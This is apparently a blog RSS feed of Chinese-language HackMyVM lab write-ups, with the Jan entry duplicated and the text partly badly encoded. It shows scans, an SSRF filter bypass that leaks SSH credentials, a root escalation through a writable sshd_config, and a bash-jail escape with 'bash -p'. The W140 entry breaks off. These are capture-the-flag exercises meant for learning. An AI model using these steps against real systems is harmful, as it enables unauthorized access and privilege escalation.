jan:~$ vi /etc/ssh/sshd_config
```

![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)

```
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                             [ ok ]
 * Starting sshd ...                                                                                                             [ ok ]
jan:~$ ssh root@127.0.0.1
/etc/ssh/ssh_config: line 23: Bad configuration option: banner
/etc/ssh/ssh_config: terminating, 1 bad configuration options
```

bannerÂ∫îËØ•‰πüËÉΩÊèêÊùÉÔºå‰ΩÜÊòØÊàë‰∏çÁÆ°ÂÆÉ‰∫Ü

```
jan:~$ vi /etc/ssh/ssh_config
```

![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)

```
jan:~$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 5.Á¨¨‰∫åÁßçÊñπÊ≥ï

![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)

üîóhttps://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83

Ëøô‰∏™ÊñπÊ≥ïÊàëÊ≤°ËØïËøáÔºåËá™Â∑±Â∞ùËØï‰∏Ä‰∏ãÂêß

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_jan.html</guid><pubDate>Fri, 27 Jun 2025 09:27:54 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPHK.github.io/post/hmv_jan.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=jan
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.136
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
Nmap scan report for 192.168.205.136
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 03 Feb 2025 04:40:49 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header');
MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.205.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
                                                                             
```

8080Á´ØÂè£sTÂíåsSÂèÇÊï∞Êé¢Êµã‰∏çÂá∫Êù•ÔºåÊâÄ‰ª•Âª∫ËÆÆ‰∏ç‰ΩøÁî®

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/                            
Welcome to our Public Server. Maybe Internal.                                                                                                                                    
```

ËøõË°åÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.136:8080
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, md, txt]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
[####################] - 54s   598005/598005  0s      found:2       errors:0    
[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
```

Êé¢Á¥¢‰∏ÄÊ≥¢

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/redirect
Parameter 'url' needed.
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/robots.txt
/redirect
/credz                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
```

ÁõÆÂâçÊù•ÁúãÂá∫È¢òÊÄùË∑ØÊòØÈÄöËøá/redirectËÆøÈóÆ/credzÔºåËøõË°åÂ∞ùËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
Only accessible internally.                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 04:47:07 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8
```

ËøôÈáåÊàëÊµãËØï‰∫ÜÊå∫Â§öÁªïËøáÊ£ÄÊµãÁöÑÊñπÊ≥ïÔºåÊàëÂ∞±‰∏çÂÜôÂá∫Êù•‰∫ÜÔºåÊ≠£Á°ÆÊñπÊ≥ïÊòØ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
                                         
```

ËøîÂõûÁ©∫ÁôΩÔºåÁ©∫ÁôΩÂ∞±ÊòØÊúâÊú∫ÂèØÂØª

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
ssh/EazyLOL                                                                                                                                     
```

ÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh ssh@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
ssh@192.168.205.136's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

# 4.ÊèêÊùÉ

```
jan:~$ ls -al
total 12
drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

Â§ßÊ¶ÇÁéáÊòØÊîπsshÁöÑÈÖçÁΩÆÊñá‰ª∂‰∫ÜÔºåÁúãÁúãÊúâÊ≤°ÊúâÊùÉÈôê

```
jan:~$ ls -al /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
```

ÊúâÊùÉÈôêÔºåÈÇ£Êàë‰ª¨ÁîüÊàê‰∏Ä‰∏™ÂØÜÈí•ÔºåÈÄöËøáÂØÜÈí•ÁôªÂΩïrootÂ∞±Â•Ω‰∫Ü

```
jan:~$ ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
Created directory '/home/ssh/.ssh'.
Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ssh/.ssh/id_rsa
Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|  +.*o o*+ .     |
| . *  o.ooo      |
|  o .. ..o       |
| o . ...o        |
|. .   . SE       |
|.o   .  ..+      |
|B*    ..+= .     |
|Xo=.   .ooo      |
|oB*o     ..      |
+----[SHA256]-----+

jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
jan:~$ chmod 600 /tmp/authorized_keys 
jan:~$ ls -la /tmp/
total 8
drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys

jan:~$ vi /etc/ssh/sshd_config
```

![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)

```
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                             [ ok ]
 * Starting sshd ...                                                                                                             [ ok ]
jan:~$ ssh root@127.0.0.1
/etc/ssh/ssh_config: line 23: Bad configuration option: banner
/etc/ssh/ssh_config: terminating, 1 bad configuration options
```

bannerÂ∫îËØ•‰πüËÉΩÊèêÊùÉÔºå‰ΩÜÊòØÊàë‰∏çÁÆ°ÂÆÉ‰∫Ü

```
jan:~$ vi /etc/ssh/ssh_config
```

![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)

```
jan:~$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 5.Á¨¨‰∫åÁßçÊñπÊ≥ï

![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)

üîóhttps://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83

Ëøô‰∏™ÊñπÊ≥ïÊàëÊ≤°ËØïËøáÔºåËá™Â∑±Â∞ùËØï‰∏Ä‰∏ãÂêß

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_jan.html</guid><pubDate>Fri, 27 Jun 2025 09:27:15 +0000</pubDate></item><item><title>hello world</title><link>https://7r1UMPHK.github.io/post/hello%20world.html</link><description>hello worldsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hello%20world.html</guid><pubDate>Fri, 27 Jun 2025 09:15:28 +0000</pubDate></item><item><title>Áæ§‰∏ªÈ¢ò</title><link>https://7r1UMPHK.github.io/post/qun-zhu-ti.html</link><description>Â•Ω‰πÖÊ≤°ÊâìËøáÈù∂Êú∫‰∫ÜÔºå‰πüÊ≤°Êõ¥Êñ∞ËøáÔºå‰ªäÂ§©Âú®Áæ§ÈáåÁúãÂà∞‰∫ÜÁæ§‰∏ªÂèë‰∫Ü‰∏Ä‰∏™È¢òÁõÆÂ∞±Áé©‰∫Ü‰∏Ä‰∏ãÔºåÈ°∫‰æøÊ∞¥‰∏ÄÊúüwp

È¢òÁõÆÔºö

![image-20250322153403638](https://7r1umphk.github.io/image/20250322153403675.png)

```
PATH=/usr/bin
read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
eval '$INPUT'
```

ÊµÖÁûÑ‰∫Ü‰∏ÄÁúºÔºåÂèëÁé∞trÂà†Èô§‰∫ÜÊâÄÊúâÂ≠óÊØç„ÄÅÊï∞Â≠óÂíåÊñúÊù†Ôºå‰ΩÜ‰øùÁïôÁâπÊÆäÁ¨¶Âè∑ÔºåÈÇ£Â∞±ÊúâÊêûÂ§¥

ps:$@ Âú® Shell ‰∏≠Ë°®Á§∫ËÑöÊú¨ÁöÑÊâÄÊúâÂèÇÊï∞ÔºåÂèØË¢´ eval Ëß£Êûê„ÄÇ



Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†ËæìÂÖ•$@ÔºåÁªïËøáÂ≠óÁ¨¶ËøáÊª§„ÄÇÁÑ∂ÂêéÂÜç‰º†ÈÄíÂèÇÊï∞bash -pÂêØÂä®ÁâπÊùÉShell„ÄÇ

Ëß£Ê≥ïÔºö

```
echo '$@' | ./a.sh 'bash -p'
```

‰ΩÜÊòØÊàëÁöÑ‰∏çÊòØÈ¢ÑÊúüËß£

![image-20250322153428456](https://7r1umphk.github.io/image/20250322153428487.png)

![image-20250322153442791](https://7r1umphk.github.io/image/20250322153442822.png)

Ëøô‰∏§‰∏™ÊòØÈ¢ÑÊúüÁöÑ

ÁÑ∂Âêé.....

![image-20250322153453994](https://7r1umphk.github.io/image/20250322153454035.png)

Âä†Âº∫ÁâàÔºö

```
#!/bin/bash

PATH=/usr/bin

a=$((RANDOM%100))

echo $a

read -r INPUTS


if [[ '$INPUTS' -ne '$a' ]]; then
    exit 1
fi

read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
eval '$INPUT'
```

Âä†‰∫Ü‰∏Ä‰∏™ÈöèÊú∫Êï∞ÔºåÊàëÊú¨Ë∫´ÊòØËØ¥ÁàÜÁ†¥ÁöÑ......

![image-20250322153509806](https://7r1umphk.github.io/image/20250322153509848.png)

ÁÑ∂ÂêéÂêéÈù¢ÊúâÁ©∫ÁûÑ‰∫ÜÂá†ÁúºÔºåÂõ†‰∏∫ÊàëÁü•ÈÅìÂÆÉÂú®ËøõË°åÊï¥Êï∞ÁöÑÊØîËæÉÔºåÈÇ£ÊàëÂ∞±Âú®ÊÉ≥Â¶ÇÊûúËæìÂÖ•‰∏Ä‰∏™ÈùûÊï¥Êï∞‰ºöÊÄé‰πàÊ†∑ÔºåÁÑ∂Âêé......

![image-20250322153523210](https://7r1umphk.github.io/image/20250322153523241.png)

ÊúâÊàè

![image-20250322153725388](https://7r1umphk.github.io/image/20250322153725419.png)

ÁÑ∂ÂêéÊàëÂêéÈù¢ÊàëÊÉ≥Êâæ‰∏Ä‰∏ãËøôÊñπÈù¢ÁöÑËµÑÊñôÔºå‰ΩÜÊòØÊàëÊ≤°ÊâæÂà∞ÔºåÊàëÊâìÁÆóÊòéÂ§©ÂÜçÂéªÈóÆÈóÆÁæ§‰∏ªÔºåÂõ†‰∏∫‰ªñbashÊØîËæÉÂ•ΩÔºà‰∏çËøáÊàëÊÑüËßâ‰ªñ‰ºöËá™Â∑±Êù•ÁúãÊàëÁöÑwpÔºâ

ÁõÆÂâçÊàëÁöÑÁêÜËß£ÊòØÂΩì‰ΩøÁî®-neÊØîËæÉÈùûÊï∞Â≠óÂ≠óÁ¨¶‰∏≤Êó∂ÔºåBash‰ºöÂ∞ùËØïÂ∞Ü‰∏§ËæπËΩ¨Êç¢‰∏∫Êï¥Êï∞„ÄÇÂ¶ÇÊûúËΩ¨Êç¢Â§±Ë¥•ÔºåÂ∞±‰ºöÊä•Èîô‰ªÄ‰πàÁöÑÔºå[[ ]]Ë°®ËææÂºèÁöÑÁªìÊûú‰ºöË¢´ËßÜ‰∏∫falseÔºåÂõ†‰∏∫ÊØîËæÉÊìç‰ΩúÊú¨Ë∫´Êó†ÊïàÔºåÂØºËá¥Êï¥‰∏™Êù°‰ª∂Âà§Êñ≠‰∏∫ÂÅáÔºåÂõ†Ê≠§‰∏çÊâßË°åexit 1„ÄÇ



‰∏çÁÆ°‰∫ÜÔºåÁù°ËßâÔºåÁ≠âÁæ§‰∏ªÁªôÊàëËß£ÊÉë‰∫Ü

&lt;!-- ##{'timestamp':1740728321}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/qun-zhu-ti.html</guid><pubDate>Fri, 28 Feb 2025 07:38:41 +0000</pubDate></item><item><title>hmv_w140</title><link>https://7r1UMPHK.github.io/post/hmv_w140.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=W140
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.131
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

# 2.Ë∏©ÁÇπ

![image-20250331185843031](https://7r1umphk.github.io/image/20250331185843370.png)

Êúâ‰∏™‰∏ä‰º†È°µ/service.htmlÔºå‰∏ä‰º†‰∏™È©¨ÁúãÁúã„ÄÇ‰∏çË°åÔºåÊàë‰ª¨‰∏ä‰º†Ê≠£Â∏∏ÁöÑÂõæÁâá

![image-20250331185853481](https://7r1umphk.github.io/image/20250331185853810.png)

![image-20250331185859700](https://7r1umphk.github.io/image/20250331185859788.png)

ÊêúÁ¥¢‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂà©Áî®ÊºèÊ¥û

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit ExifTool 12.37       
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
